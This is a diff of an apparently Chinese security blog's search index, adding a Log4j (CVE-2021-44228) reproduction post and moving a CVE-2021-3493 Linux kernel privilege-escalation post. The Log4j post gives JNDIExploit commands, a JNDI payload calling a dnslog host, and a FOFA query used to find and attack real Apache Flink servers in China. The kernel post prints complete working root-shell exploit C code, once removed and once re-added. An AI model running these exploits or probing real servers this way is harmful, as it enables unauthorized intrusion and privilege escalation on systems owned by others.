@@ -33,6 +33,36 @@
       </tags>
   </entry>
   <entry>
+    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
+    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
+<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
+<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
+<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
+<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
+<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.12</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【CVE-2020-17519/17518】Apache Flink任意文件上传/读取漏洞复现</title>
     <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
@@ -292,181 +322,6 @@ python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F
       </categories>
       <tags>
         <tag>2021.11</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
-    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
-cat &#x2F;etc&#x2F;issue        显示发行版本信息
-cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
-lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
-chmod +x exploit             给执行权限
-.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
-<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
-#define _GNU_SOURCE
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;err.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;sched.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-#include &lt;sys&#x2F;stat.h&gt;
-#include &lt;sys&#x2F;wait.h&gt;
-#include &lt;sys&#x2F;mount.h&gt;
-
-&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
-&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
-int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
-
-
-#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
-#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
-#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
-#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
-#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
-#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
-#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
-
-
-static void xmkdir(const char *path, mode_t mode)
-&#123;
-    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
-        err(1, &quot;mkdir %s&quot;, path);
-&#125;
-
-static void xwritefile(const char *path, const char *data)
-&#123;
-    int fd &#x3D; open(path, O_WRONLY);
-    if (fd &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, path);
-    ssize_t len &#x3D; (ssize_t) strlen(data);
-    if (write(fd, data, len) !&#x3D; len)
-        err(1, &quot;write %s&quot;, path);
-    close(fd);
-&#125;
-
-static void xcopyfile(const char *src, const char *dst, mode_t mode)
-&#123;
-    int fi, fo;
-
-    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, src);
-    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
-        err(1, &quot;open %s&quot;, dst);
-
-    char buf[4096];
-    ssize_t rd, wr;
-
-    for (;;) &#123;
-        rd &#x3D; read(fi, buf, sizeof(buf));
-        if (rd &#x3D;&#x3D; 0) &#123;
-            break;
-        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
-            if (errno &#x3D;&#x3D; EINTR)
-                continue;
-            err(1, &quot;read %s&quot;, src);
-        &#125;
-
-        char *p &#x3D; buf;
-        while (rd &gt; 0) &#123;
-            wr &#x3D; write(fo, p, rd);
-            if (wr &#x3D;&#x3D; -1) &#123;
-                if (errno &#x3D;&#x3D; EINTR)
-                    continue;
-                err(1, &quot;write %s&quot;, dst);
-            &#125;
-            p +&#x3D; wr;
-            rd -&#x3D; wr;
-        &#125;
-    &#125;
-
-    close(fi);
-    close(fo);
-&#125;
-
-static int exploit()
-&#123;
-    char buf[4096];
-
-    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
-    system(buf);
-
-    xmkdir(DIR_BASE, 0777);
-    xmkdir(DIR_WORK,  0777);
-    xmkdir(DIR_LOWER, 0777);
-    xmkdir(DIR_UPPER, 0777);
-    xmkdir(DIR_MERGE, 0777);
-
-    uid_t uid &#x3D; getuid();
-    gid_t gid &#x3D; getgid();
-
-    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
-        err(1, &quot;unshare&quot;);
-
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
-
-    sprintf(buf, &quot;0 %d 1&quot;, uid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
-
-    sprintf(buf, &quot;0 %d 1&quot;, gid);
-    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
-
-    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
-    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
-        err(1, &quot;mount %s&quot;, DIR_MERGE);
-
-    &#x2F;&#x2F; all+ep
-    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
-
-    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
-    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
-        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
-
-    return 0;
-&#125;
-
-int main(int argc, char *argv[])
-&#123;
-    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
-        setuid(0);
-        setgid(0);
-        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
-        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
-    &#125;
-
-    pid_t child &#x3D; fork();
-    if (child &#x3D;&#x3D; -1)
-        err(1, &quot;fork&quot;);
-
-    if (child &#x3D;&#x3D; 0) &#123;
-        _exit(exploit());
-    &#125; else &#123;
-        waitpid(child, NULL, 0);
-    &#125;
-
-    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
-    err(1, &quot;execl %s&quot;, BIN_UPPER);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
-]]></content>
-      <categories>
-        <category>Linux安全</category>
-        <category>系统安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.4</tag>
       </tags>
   </entry>
   <entry>
@@ -856,6 +711,181 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
       </categories>
       <tags>
         <tag>2021.3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
+    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
+cat &#x2F;etc&#x2F;issue        显示发行版本信息
+cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
+lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
+chmod +x exploit             给执行权限
+.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;mount.h&gt;
+
+&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
+&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
+#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
+#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
+#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
+#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
+#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
+#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
+
+
+static void xmkdir(const char *path, mode_t mode)
+&#123;
+    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
+        err(1, &quot;mkdir %s&quot;, path);
+&#125;
+
+static void xwritefile(const char *path, const char *data)
+&#123;
+    int fd &#x3D; open(path, O_WRONLY);
+    if (fd &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, path);
+    ssize_t len &#x3D; (ssize_t) strlen(data);
+    if (write(fd, data, len) !&#x3D; len)
+        err(1, &quot;write %s&quot;, path);
+    close(fd);
+&#125;
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+&#123;
+    int fi, fo;
+
+    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, src);
+    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) &#123;
+        rd &#x3D; read(fi, buf, sizeof(buf));
+        if (rd &#x3D;&#x3D; 0) &#123;
+            break;
+        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
+            if (errno &#x3D;&#x3D; EINTR)
+                continue;
+            err(1, &quot;read %s&quot;, src);
+        &#125;
+
+        char *p &#x3D; buf;
+        while (rd &gt; 0) &#123;
+            wr &#x3D; write(fo, p, rd);
+            if (wr &#x3D;&#x3D; -1) &#123;
+                if (errno &#x3D;&#x3D; EINTR)
+                    continue;
+                err(1, &quot;write %s&quot;, dst);
+            &#125;
+            p +&#x3D; wr;
+            rd -&#x3D; wr;
+        &#125;
+    &#125;
+
+    close(fi);
+    close(fo);
+&#125;
+
+static int exploit()
+&#123;
+    char buf[4096];
+
+    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid &#x3D; getuid();
+    gid_t gid &#x3D; getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
+        err(1, &quot;unshare&quot;);
+
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
+
+    sprintf(buf, &quot;0 %d 1&quot;, uid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
+
+    sprintf(buf, &quot;0 %d 1&quot;, gid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
+
+    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
+        err(1, &quot;mount %s&quot;, DIR_MERGE);
+
+    &#x2F;&#x2F; all+ep
+    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
+
+    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
+        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
+
+    return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
+        setuid(0);
+        setgid(0);
+        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
+        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
+    &#125;
+
+    pid_t child &#x3D; fork();
+    if (child &#x3D;&#x3D; -1)
+        err(1, &quot;fork&quot;);
+
+    if (child &#x3D;&#x3D; 0) &#123;
+        _exit(exploit());
+    &#125; else &#123;
+        waitpid(child, NULL, 0);
+    &#125;
+
+    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
+    err(1, &quot;execl %s&quot;, BIN_UPPER);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
+]]></content>
+      <categories>
+        <category>Linux安全</category>
+        <category>系统安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.4</tag>
       </tags>
   </entry>
   <entry>
